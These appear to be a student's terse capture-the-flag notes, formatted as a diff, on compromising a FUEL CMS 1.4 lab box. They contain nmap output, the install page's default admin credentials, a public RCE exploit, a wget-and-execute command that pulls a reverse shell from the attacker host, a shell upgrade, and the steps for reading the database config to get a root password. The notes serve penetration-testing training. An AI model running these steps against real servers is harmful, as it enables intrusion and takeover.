@@ -1,0 +1,115 @@
+└─# nmap -A -sC -sV 10.10.78.171                                                                     1 ⨯
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-10 13:57 IST
+Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 76.50% done; ETC: 13:58 (0:00:15 remaining)
+Stats: 0:09:11 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 32.26% done; ETC: 14:06 (0:00:00 remaining)
+Stats: 0:09:13 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 32.26% done; ETC: 14:06 (0:00:04 remaining)
+Nmap scan report for 10.10.78.171
+Host is up (0.55s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Welcome to FUEL CMS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+
+TRACEROUTE (using port 5900/tcp)
+HOP RTT     ADDRESS
+1   5.36 ms 10.4.0.1
+2   ... 3
+4   5.72 ms 10.10.78.171
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 581.81 seconds
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Welcome to Fuel CMS
+Version 1.4
+Getting Started
+
+    1
+    Change the Apache .htaccess file
+
+    Change the Apache .htaccess found at the root of FUEL CMS's installation folder to the proper RewriteBase directory. The default is your web server's root directory (e.g "/"), but if you have FUEL CMS installed in a sub folder, you will need to add the path to line 5. If you are using the folder it was zipped up in from GitHub, it would be RewriteBase /FUEL-CMS-master/.
+
+    In some server environments, you may need to add a "?" after index.php in the .htaccess like so: RewriteRule .* index.php?/$0 [L]
+
+    NOTE: This is the only step needed if you want to use FUEL without the CMS.
+    2
+    Install the database
+
+    Install the FUEL CMS database by first creating the database in MySQL and then importing the fuel/install/fuel_schema.sql file. After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database to match the new database you created.
+    3
+    Make folders writable
+
+    Make the following folders writable (666 = rw-rw-rw, 777 = rwxrwxrwx, etc.):
+        /var/www/html/fuel/application/cache/
+        (folder for holding cache files)
+        /var/www/html/fuel/application/cache/dwoo/
+        (folder for holding template cache files)
+        /var/www/html/fuel/application/cache/dwoo/compiled
+        (for writing compiled template files)
+        /var/www/html/assets/images
+        (for managing image assets in the CMS)
+    4
+    Make configuration changes
+        In the fuel/application/config/config.php, change the $config['encryption_key'] to your own unique key.
+        In the fuel/application/config/MY_fuel.php file, change the $config['fuel_mode'] configuration property to AUTO. This must be done only if you want to view pages created in the CMS.
+        In the fuel/application/config/config.php file, change the $config['sess_save_path'] configuration property to a writable folder above the web root to save session files OR leave it set to NULL to use the default PHP setting.
+
+That's it!
+
+To access the FUEL admin, go to:
+http://10.10.78.171/fuel
+User name: admin
+Password: admin (you can and should change this password and admin user information after logging in)
+
+
+run exploit 47138.py 
+RCE and enter cmd in double quotes only 
+
+
+
+you might let phpbash to be uploaded via exploit or msfvenom payload and get revrse shell. Payloads must be uploaded by attacker machine only
+ python3 -m http.server 
+ wget http://<ip:port>/phpbash.php
+
+Upon executing the following command through the exploit used above, the reverse shell is downloaded and executed, granting access as the www-data user:
+
+wget 10.4.58.116:8000/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+/home/www-data/flag.txt
+
+locate database.php
+
+cat /var/www/html/fuel/applictaion/config/database.php
+
+got root passwd mememe
+
+su root and you will get root.txt flag
+
